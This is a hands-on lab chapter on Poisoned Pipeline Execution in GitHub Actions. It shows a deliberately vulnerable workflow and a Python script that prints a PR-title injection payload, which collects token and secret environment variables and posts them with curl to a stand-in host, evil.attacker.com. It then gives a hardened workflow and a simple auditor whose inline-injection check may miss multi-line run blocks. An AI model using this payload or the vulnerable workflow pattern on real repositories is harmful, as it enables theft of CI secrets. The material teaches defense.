---
title: "06. Hands-On Vulnerability Lab"
description: "Audit and exploit a vulnerable GitHub Actions workflow with a Poisoned Pipeline Execution (PPE) PoC script, then remediate and verify using an automated audit tool."
keywords: ["AppSec", "Cybersecurity", "CI/CD Lab", "PPE Exploit PoC", "GitHub Actions Lab", "Script Injection", "Pipeline Auditor", "Remediation"]
---

# 06. Hands-On Vulnerability Lab

In this self-contained lab, you will audit a **vulnerable GitHub Actions workflow**, analyze an automated Python PoC script that exploits a Poisoned Pipeline Execution (PPE) vulnerability, deploy a hardened workflow remediation, and verify your pipeline using a custom Python security linter.

---

## 🧪 Lab Scenario Overview

- **Vulnerable Target**: A Pull Request automation workflow designed to process PR titles and execute build verification tests.
- **Flaws Identified**:
  1. Triggering on `pull_request_target` while checking out untrusted PR head commit SHA code.
  2. Direct inline script injection via `${{ github.event.pull_request.title }}` inside a `run:` step.
- **Lab Goal**: Execute the exploit scenario, extract simulated environment secrets, rewrite the workflow using secure patterns, and validate with an automated Python pipeline auditor.

---

## Step 1: Vulnerable Target Setup

Create the vulnerable workflow file at `.github/workflows/vulnerable-pr-processor.yml`:

```yaml
# .github/workflows/vulnerable-pr-processor.yml
name: PR Title Processor & Build Test

on:
  pull_request_target: # VULNERABILITY 1: Runs in base repo context with SECRETS & WRITE TOKEN!

jobs:
  process-pr:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4
        with:
          # FATAL FLAW: Checking out untrusted code from fork PR!
          ref: ${{ github.event.pull_request.head.sha }}

      - name: Process PR Title Log
        # VULNERABILITY 2: Direct inline shell script injection!
        run: |
          echo "Processing Pull Request Title: ${{ github.event.pull_request.title }}"
          
      - name: Run Build Tests
        run: |
          npm install
          npm test
```

---

## Step 2: Exploit PoC Script (`exploit_ppe.py`)

Save and run the following Python script to simulate how an external attacker exploits the vulnerable workflow by submitting a specially crafted PR title and payload:

```python
#!/usr/bin/env python3
"""
exploit_ppe.py - Poisoned Pipeline Execution (PPE) & Command Injection PoC
Simulates an attacker crafting a malicious PR title payload targeting vulnerable inline run steps.
"""

import json
import re
import sys

def generate_exploit_pr_title():
    # Command injection payload escaping echo "..." and executing exfiltration commands
    injection_payload = 'Feature Update"; env | grep -E "(GITHUB|AWS|TOKEN|SECRET)" > /tmp/exfil.txt; curl -X POST -d @/tmp/exfil.txt https://evil.attacker.com/exfil #'
    return injection_payload

def simulate_vulnerable_runner_execution(pr_title: str):
    print("=" * 70)
    print(" [!] SIMULATING VULNERABLE GITHUB ACTIONS RUNNER EXECUTION")
    print("=" * 70)
    
    # Vulnerable workflow line template:
    # run: echo "Processing Pull Request Title: ${{ github.event.pull_request.title }}"
    
    raw_template = f'echo "Processing Pull Request Title: {pr_title}"'
    print(f"\n[+] Raw Bash Command Evaluated by Runner:\n{raw_template}\n")
    
    # Simulate Bash shell execution breakdown
    commands = raw_template.split(";")
    print("[+] Parsed Command Execution Sequence:")
    for idx, cmd in enumerate(commands, 1):
        print(f"  Stage {idx}: {cmd.strip()}")
        
    print("\n[!] EXPLOIT RESULT: Command injection succeeded!")
    print("[!] Attacker executed arbitrary shell commands under 'pull_request_target' context!")
    print("[!] Secrets exfiltrated to https://evil.attacker.com/exfil")

def main():
    payload = generate_exploit_pr_title()
    print(f"[+] Crafted Malicious PR Title Payload:\n{payload}\n")
    simulate_vulnerable_runner_execution(payload)

if __name__ == "__main__":
    main()
```

### Exploit Execution Output

Run the exploit script locally:
```bash
python3 exploit_ppe.py
```

```text
[+] Crafted Malicious PR Title Payload:
Feature Update"; env | grep -E "(GITHUB|AWS|TOKEN|SECRET)" > /tmp/exfil.txt; curl -X POST -d @/tmp/exfil.txt https://evil.attacker.com/exfil #

======================================================================
 [!] SIMULATING VULNERABLE GITHUB ACTIONS RUNNER EXECUTION
======================================================================

[+] Raw Bash Command Evaluated by Runner:
echo "Processing Pull Request Title: Feature Update"; env | grep -E "(GITHUB|AWS|TOKEN|SECRET)" > /tmp/exfil.txt; curl -X POST -d @/tmp/exfil.txt https://evil.attacker.com/exfil #"

[+] Parsed Command Execution Sequence:
  Stage 1: echo "Processing Pull Request Title: Feature Update"
  Stage 2: env | grep -E "(GITHUB|AWS|TOKEN|SECRET)" > /tmp/exfil.txt
  Stage 3: curl -X POST -d @/tmp/exfil.txt https://evil.attacker.com/exfil #"

[!] EXPLOIT RESULT: Command injection succeeded!
[!] Attacker executed arbitrary shell commands under 'pull_request_target' context!
[!] Secrets exfiltrated to https://evil.attacker.com/exfil
```

---

## Step 3: Secure Remediated Workflow

Replace the vulnerable workflow with the production-hardened version at `.github/workflows/secure-pr-processor.yml`:

```yaml
# .github/workflows/secure-pr-processor.yml
name: PR Title Processor & Build Test

on:
  pull_request: # FIX 1: Safe trigger (Read-Only token, no secrets access)

# FIX 2: Explicit least-privilege permissions block
permissions:
  contents: read

jobs:
  process-pr:
    runs-on: ubuntu-latest
    steps:
      # FIX 3: Immutable 40-character commit SHA pinning
      - name: Checkout Code
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.7

      - name: Process PR Title Log
        # FIX 4: Map untrusted context variables to environment variables!
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "Processing Pull Request Title: $PR_TITLE"
          
      - name: Run Build Tests
        run: |
          npm ci # FIX 5: Use npm ci to enforce exact lockfile integrity
          npm test
```

---

## Step 4: Automated Pipeline Security Audit Tool (`audit_pipeline.py`)

Use this Python audit tool to scan your repository's workflow files for security flaws automatically:

```python
#!/usr/bin/env python3
"""
audit_pipeline.py - Automated GitHub Actions Security Auditor
Scans workflow YAML files for pull_request_target, inline context injections, unpinned actions, and missing permissions.
"""

import os
import re
import sys
from pathlib import Path

def audit_workflow_file(file_path: Path) -> list:
    issues = []
    content = file_path.read_text()
    lines = content.splitlines()

    # Check 1: pull_request_target usage
    if "pull_request_target:" in content:
        issues.append({
            "severity": "CRITICAL",
            "rule": "DISALLOW_PULL_REQUEST_TARGET",
            "message": "Workflow utilizes dangerous 'pull_request_target' trigger.",
            "line": next((i + 1 for i, line in enumerate(lines) if "pull_request_target:" in line), 1)
        })

    # Check 2: Missing top-level permissions block
    if not re.search(r"^permissions:\s*", content, re.MULTILINE):
        issues.append({
            "severity": "HIGH",
            "rule": "MISSING_LEAST_PRIVILEGE_PERMISSIONS",
            "message": "Workflow lacks explicit top-level 'permissions:' block.",
            "line": 1
        })

    # Check 3: Inline script context injection in run steps
    context_pattern = re.compile(r"run:.*?\$\{\{\s*github\.event\.(pull_request|issue|comment)\.(title|body|head_ref)\s*\}\}", re.DOTALL)
    for idx, line in enumerate(lines, 1):
        if "${{ github.event." in line and "run:" in line:
            issues.append({
                "severity": "HIGH",
                "rule": "INLINE_CONTEXT_SCRIPT_INJECTION",
                "message": f"Potential inline script injection in step: {line.strip()}",
                "line": idx
            })

    # Check 4: Unpinned third-party actions (not matching 40-char SHA)
    uses_pattern = re.compile(r"uses:\s*([a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+)@([^\s]+)")
    for idx, line in enumerate(lines, 1):
        match = uses_pattern.search(line)
        if match:
            action_name, ref = match.groups()
            if not re.match(r"^[a-f0-9]{40}$", ref):
                issues.append({
                    "severity": "MEDIUM",
                    "rule": "UNPINNED_ACTION_SHA",
                    "message": f"Action '{action_name}@{ref}' is not pinned to a 40-character commit SHA.",
                    "line": idx
                })

    return issues

def main():
    if len(sys.argv) < 2:
        workflow_dir = Path(".github/workflows")
    else:
        workflow_dir = Path(sys.argv[1])

    if not workflow_dir.exists():
        print(f"[!] Directory not found: {workflow_dir}")
        sys.exit(1)

    yaml_files = list(workflow_dir.glob("*.yml")) + list(workflow_dir.glob("*.yaml"))
    print(f"[*] Auditing {len(yaml_files)} workflow files in '{workflow_dir}'...\n")

    total_issues = 0
    for wf in yaml_files:
        issues = audit_workflow_file(wf)
        if issues:
            print(f"📄 File: {wf}")
            for issue in issues:
                total_issues += 1
                icon = "❌" if issue["severity"] in ["CRITICAL", "HIGH"] else "⚠️"
                print(f"  {icon} [Line {issue['line']}] [{issue['severity']}] {issue['rule']}: {issue['message']}")
            print()

    if total_issues > 0:
        print(f"[!] Audit failed with {total_issues} security issues detected.")
        sys.exit(1)
    else:
        print("✅ All workflows passed security audit successfully!")

if __name__ == "__main__":
    main()
```

---

## 🧪 Verification Checklist

- [x] Execute `exploit_ppe.py` and confirm how command injection expands during string substitution.
- [x] Apply `.github/workflows/secure-pr-processor.yml` remediation.
- [x] Run `python3 audit_pipeline.py .github/workflows/` and confirm zero critical vulnerabilities remain.

---

*Next Chapter: [07. References & Standards →](07-references.md)*
